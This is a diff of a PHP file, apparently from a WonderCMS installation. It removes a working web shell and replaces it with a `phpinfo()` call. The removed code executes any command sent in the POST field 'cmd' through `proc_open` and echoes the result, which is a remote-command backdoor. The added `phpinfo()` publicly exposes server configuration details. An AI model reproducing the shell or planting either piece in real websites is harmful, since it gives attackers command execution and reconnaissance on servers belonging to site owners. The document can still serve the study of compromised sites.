@@ -1,33 +1,6 @@
 <?php 
 
-if (isset($_POST["cmd"])) {
-    $cmd = $_POST["cmd"];
-
-    function exec_command($command) {
-        $descriptorspec = array(
-            0 => array("pipe", "r"), // Entrada padrão
-            1 => array("pipe", "w"), // Saída padrão
-            2 => array("file", "error-output.txt", "a") // Erro padrão redirecionado para arquivo
-        );
-
-        $cwd = ""; // Diretório de trabalho atual
-        $env = array('some_option' => 'aeiou'); // Ambiente
-
-        // Inicia o processo
-        $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
-
-        if (is_resource($process)) {
-            echo stream_get_contents($pipes[1]); // Lê e exibe a saída
-            fclose($pipes[1]); // Fecha a saída padrão
-            proc_close($process); // Fecha o processo
-        }
-    }
-
-    exec_command($cmd); // Executa o comando
-    exit;
-} else {
-    echo "vtx";
-}
+phpinfo();
 
 global $Wcms; 
 ?>
